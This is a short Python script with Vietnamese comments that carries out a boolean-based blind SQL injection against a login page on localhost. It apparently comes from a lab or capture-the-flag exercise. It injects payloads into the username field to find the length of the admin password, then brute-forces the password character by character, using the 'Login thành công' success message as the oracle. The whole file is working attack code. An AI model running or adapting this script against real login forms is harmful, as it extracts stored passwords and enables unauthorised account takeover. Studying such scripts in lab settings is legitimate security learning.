import requests
import re

url = "http://localhost:4000/login.php"

data = {"username":"test" , "password":"123456"} 

# xác định độ dài password 
# câu truy vấn phải bỏ trong vòng lặp để có thể được tăng giá trị i lên trước mỗi request được đẩy lên server
# tăng i trong mỗi câu request trước khi được đưa lên server 
# chúng ta xác định được độ dài password là khi mà res của server trả về nó có cụm Login thành công 
leng_password = 0
for i in range (10,40,1):
	sql = f"(SELECT length(password) FROM users WHERE username='admin') = {i}"

	payload = f" admin' AND {sql} #  "

	data["username"] = payload

	res = requests.post(url , data=data)
	
	result = re.search("Login thành công",res.text)
	if result :
		leng_password = i
		break

	

alphabet = "abcdefghijklmnopqrstuvwxyz{}_0123456789"
# khúc này cũng tương tự , sử dụng 2 vòng lặp
# một vòng lặp là để tăng số thứ tự từng vị trí , và một vòng lặp con nằm trong dùng để xác định kí tự của vị trí đó
# trước mỗi request được gửi lên server thì phải tăng j lên 
# và kí tự được xác định khi mà res trả về có cụm Login thành công 
secret = ""
for i in range (1,leng_password+1,1):
	for j in alphabet:
		sql = f"(SELECT substring(password,{i},1) FROM users WHERE username = 'admin') = '{j}'"
		
		payload = f" admin' AND {sql} # "
	
		data["username"] = payload 

		res = requests.post(url , data=data)

		result = re.search("Login thành công",res.text)

		if result:
			secret = secret + j
			break

print ( secret )